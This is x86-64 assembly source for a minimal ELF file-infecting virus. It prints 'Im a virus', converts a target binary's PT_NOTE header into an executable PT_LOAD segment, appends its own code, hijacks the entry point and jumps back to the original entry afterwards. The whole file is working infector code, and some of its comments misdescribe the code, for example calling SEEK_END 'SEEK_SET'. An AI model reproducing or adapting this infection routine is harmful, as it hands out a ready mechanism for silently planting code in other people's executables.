//build instructions:
//
//  as inj_asm_tiny.s -o inj_asm_tiny.o --64
//  ld -e 0x00000078 -Ttext 0 --oformat=binary -o inj_asm_tiny inj_asm_tiny.o
//
ELF_HEADER:
    //e_ident
    //after elf: 64bit, little-endian, current version elf standard, osabi, osabi version
    .byte    0x7f, 'E', 'L', 'F', 2, 1, 1, 0, 0,   0,   0,   0,  0, 0, 0, 0
    //type executable
    .2byte  2
    //machine... something... I mean it works   
    .2byte  62
    //version
    .4byte   1   
    //entry
    .8byte   0x40000000 + _start 
    //program header offset
    .8byte   64  
    //section header offset
    .8byte   0   
    //flags (unused)
    .4byte   0   
    .2byte  64  
    .2byte  56  
    .2byte  1   
    .2byte  0   
    .2byte  0   
    .2byte  0   

PROGRAM_HEADER:
    //type = PT_LOAD
    .4byte  1   
    //flags = PF_X + PF_R
    .4byte  5   
    //offset
    .8byte  0  
    //vaddr
    .8byte  0x40000000
    //paddr
    .8byte  0
    //filesz
    .8byte  the_end - ELF_HEADER 
    //memsz
    .8byte  the_end - ELF_HEADER 
    //align
    .8byte  0x1000

_start:
    //save registers 
    push    %rax
    push    %rbx
    push    %rcx
    push    %rdx
    push    %rdi
    push    %rsi
    //initialize stack frame
    push    %rbp
    movq    %rsp, %rbp
    //64 bytes elf header +
    //56 bytes program header +
    //20 bytes local memory
    // = 140 but we have to be able to store fstat first so 144
    sub     $144, %rsp

    //execute payload
    //string "Im a virus\n\0"
    movq    $0x61206d49, (%rsp)
    movq    $0x72697620, 4(%rsp)
    movq    $0x000a7375, 8(%rsp)
    //sys write
    xor     %eax, %eax
    movb    $1, %al
    //stdout
    xor     %edi, %edi 
    movb    $1, %dil
    //buffer%
    movq    %rsp, %rsi
    //11 characters
    xor     %edx, %edx
    movb    $11, %dl
    syscall

    //filename "hello"
    movq    $0x6c6c6568, (%rsp)
    movq    $0x006f,  4(%rsp)
    //sys open
    xor     %rax, %rax
    movb    $2, %al
    //fname
    movq    %rsp, %rdi
    //mode RW
    xor     %rsi, %rsi
    movb    $2, %sil 

    xor     %rdx, %rdx
    syscall

    cmp     $0, %eax
    js      Lexit     
    
    //save fd
    movq    %rax, %r12

    //fstat
    //fd
    movl    %eax, %edi
    movb    $5, %al
    movq    %rsp, %rsi
    syscall

    //save st_size
    movl    48(%rsp), %eax
    movl    %eax, -4(%rbp)
    //fstat no longer needed, reuse stack space

    //read elf header
    xor     %eax, %eax
    //fd
    movq    %r12, %rdi 
    movq    %rsp, %rsi
    xor     %rdx, %rdx
    //size of elf header
    movb    $64, %dl
    syscall

    //lseek
    xor     %eax, %eax
    movb    $8, %al
    //fd
    movq    %r12, %rdi
    xor     %esi, %esi
    xor     %edx, %edx
    //SEEK_SET
    movb    $2, %dl
    syscall
    //save eof
    movl    %eax, -8(%rbp)

    //for(int i = 0; i < phnum, i++)
    xor     %eax, %eax
    movl    %eax, -12(%rbp)
    Lstart_loop:
        //calculate phdr[i] offset
        //rax has already got index either from before loop or after continue label
        movq    %rax, %r10
        //r10 *= e_phentsize
        movq    $56, %rbx
        imul    %rbx, %r10
        //r10 += e_phoff
        movzwq  32(%rsp), %rbx
        add     %rbx, %r10
        //save offset
        movq    %r10, -20(%rbp)

        //pread64
        xor     %rax, %rax
        movq    $0, %rax
        movb    $17, %al 
        //fd
        movq    %r12, %rdi
        movq    %rsp, %rsi
        addq    $64, %rsi
        //e_phentsize
        xor     %rdx, %rdx
        movb    $56, %dl
        syscall

        //take p_type (offset 0) and compare to PT_NOTE (4)
        movl    64(%rsp), %eax
        cmpl    $4, %eax
        jne     Lcontinue
        //if(p_type == PT_NOTE)
            //p_type = PT_LOAD
            xor     %eax, %eax
            movb    $1, %al
            movl    %eax, 64(%rsp)
            //p_flags (offset 4) = PF_R + PF_X
            movb    $5, %al
            movl    %eax, 68(%rsp)
            //p_offset (offset 8) = eof
            movzwq  -8(%rbp), %rax
            movq    %rax, 72(%rsp)
            //p_vaddr (offset 24) = st_size + 0xc000000
            movzwq  -4(%rbp), %rax
            add     $0xc000000, %rax
            movq    %rax, 80(%rsp)
            //save vaddr
            movq    %rax, %r13
            //p_filesz (offset 32) = length of code
            xor     %rax, %rax
            lea     the_end(%rax), %rax
            lea     -_start(%rax), %rax
            movq    %rax, 96(%rsp)
            movq    %rax, %r15
            //p_memsz (offset 40) = p_filesz
            movq    %rax, 104(%rsp)
            //p_align (offset 48) = 0x200000
            movq    $0x200000, %rax
            movq    %rax, 112(%rsp)

            //write phdr
            xor     %rax, %rax
            movb    $18, %al
            //fd
            movq    %r12, %rdi
            //buffer
            movq    %rsp, %rsi
            addq    $64, %rsi
            //size
            xor     %rdx, %rdx
            movb    $56, %dl
            //offset
            movq    -20(%rbp), %r10
            syscall

            //write payload
            //calculate beginning with age old delta memory offset trick
            call .delta
            .delta:
                popq    %rax
            
            lea     _start(%rax), %rax
            lea     -.delta(%rax), %rsi
            //pwrite64
            xor     %rax, %rax
            movb    $18, %al
            //fd
            movq    %r12, %rdi
            //size
            movq    %r15, %rdx
            //offset (eof)
            movzwq  -8(%rbp), %r10
            syscall

            //save original entry point
            movq    24(%rsp), %r14

            //calculate entry point
            movzwq  -4(%rbp), %rax
            add     $0xc000000, %rax
            //e_entry = %rax (offset 24)
            movq    %rax, 24(%rsp)

            //write elf header back (pwrite64)
            xor     %rax, %rax
            movb    $18, %al
            //fd
            movq    %r12, %rdi
            movq    %rsp, %rsi
            xor     %rdx, %rdx
            movb    $64, %dl
            xor     %r10, %r10
            syscall

            //put jmp original_entry at the end of infected file
            //calculate relative jmp addr
            //oentry - size - vaddr
            //jmp (addr) is 5B on (%rsp)
            sub     %r15, %r14
            sub     %r13, %r14
            movb    $0xe9, %al
            movb    %al, (%rsp)
            movq    %r14, %rax
            movl    %eax, 1(%rsp)
            //calculate offset to write
            movzwq  -8(%rbp), %rax
            add     %r15, %rax
            sub     $6, %rax
            movq    %rax, %r10
            //write (pwrite64)
            xor     %rax, %rax
            movb    $18, %al 
            movq    %r12, %rdi
            movq    %rsp, %rsi
            xor     %rdx, %rdx
            movb    $5, %dl
            syscall

            //close and exit
            movb    $3, %al
            movq    %r12, %rdi
            syscall

            xor     %rdi, %rdi
            jmp     Lexit

        Lcontinue:
        incl    -12(%rbp)
        movl    -12(%rbp), %eax
        //compare against e_phnum
        cmp     56(%rsp), %eax
        jl      Lstart_loop

    movb    $1, %dil
    Lexit: 
    movq    %rbp, %rsp
    popq    %rbp
    //load registers
    pop     %rsi
    pop     %rdi
    pop     %rdx 
    pop     %rcx 
    pop     %rbx
    pop     %rax

    xor     %eax, %eax
    movb    $60, %al
    syscall
    
    the_end:


